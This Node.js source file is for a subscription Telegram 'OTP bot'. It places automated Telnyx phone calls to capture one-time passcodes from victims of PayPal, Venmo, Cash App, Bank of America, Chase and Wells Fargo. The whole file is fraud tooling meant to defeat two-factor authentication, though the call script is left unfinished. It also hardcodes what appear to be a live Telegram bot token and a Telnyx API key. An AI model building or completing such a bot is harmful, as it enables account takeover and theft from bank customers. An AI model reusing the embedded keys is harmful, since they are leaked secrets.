const { Telegraf } = require('telegraf'); // importing telegraf.js
const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
var bot = new Telegraf(bot_token)

// TELNYX STUFF 
const MY_API_KEY = 'KEY018BF55B4D0ED25E9A0861698D906F2F_xecXP42CjUQBicb53Xqadx'
const telnyx = require('telnyx')('MY_API_KEY');
const service_number = '14342338629'
const WEBHOOK_URL = 'https://ofbtc.onrender.com';

const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

async function call (service_number, customer_number, ctx){
   console.log(ctx)
   bot.telegram.sendMessage(ctx.chat.id, `call ongoing...\n Calling ${customer_number} \n please wait...`, {})

   // Use the Telnyx API to create a new call
   const { data: call } = await telnyx.calls.create({
      connection_id: ENV_TELNYX_CONNECTION_ID,
      to: customer_number,
      from: ENV_TELNYX_PHONE_NUMBER,
   });

   call.speak({

   })


}


//  COMMANDS
bot.on('start', ctx => {
   console.log(ctx.from)
   bot.telegram.sendMessage(
      ctx.chat.id, `
      𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
      ➤ Type: /purchase to subscribe \n 
      👤 USER COMMANDS 👤 \n
      ➤ /redeem - Redeem your key\n
      ➤ /checktime - Check subscription time left\n\n
      📞 CALL COMMANDS 📞 \n 
      ➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
      ➤ /bank - Capture bank OTP\n
      ➤ /boa - Capture boa OTP\n
      ➤ /chase - Capture chase OTP\n
      ➤ /wellsfargo - Capture Wells fargo OTP\n
      ➤ /venmo - Capture venmo OTP\n
      ➤ /paypal - Capture bank OTP\n      
      `, {})
})

bot.help(ctx => ctx.reply(`
   𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
➤ Type: /purchase to subscribe \n 
👤 USER COMMANDS 👤 \n
➤ /redeem - Redeem your key\n
➤ /checktime - Check subscription time left\n\n
📞 CALL COMMANDS 📞 \n 
➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
➤ /bank - Capture bank OTP\n
➤ /boa - Capture boa OTP\n
➤ /chase - Capture chase OTP\n
➤ /wellsfargo - Capture Wells fargo OTP\n
➤ /venmo - Capture venmo OTP\n
➤ /paypal - Capture bank OTP\n
`))

bot.command('start', ctx => {
   console.log(ctx)
   const number = ctx.message.text.split(' ');
   const service = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]

   if(!number[1] || !service.includes(number[3])){
      bot.telegram.sendMessage(ctx.chat.id, `❌( Error )❌ : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, `Call has Started...`, {
         reply_markup:{
            inline_keyboard: [
               [
                  {
                     text: 'End Call',
                     callback_data: 'end'
                  }               
               ]
            ]
         }
      }).then(() =>{
         console.log('yay')
         call(number[2], number[3], ctx)
      })      
   }


})
bot.launch();


// webhook urls

app.post('/call', (req, res) => {
   const digits = req.body.Digits;
   res.json(req.body)
});

app.post('/gather', (req, res) => {
   const digits = req.body.Digits;
   res.json(req.body)
});
 
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
 });
 

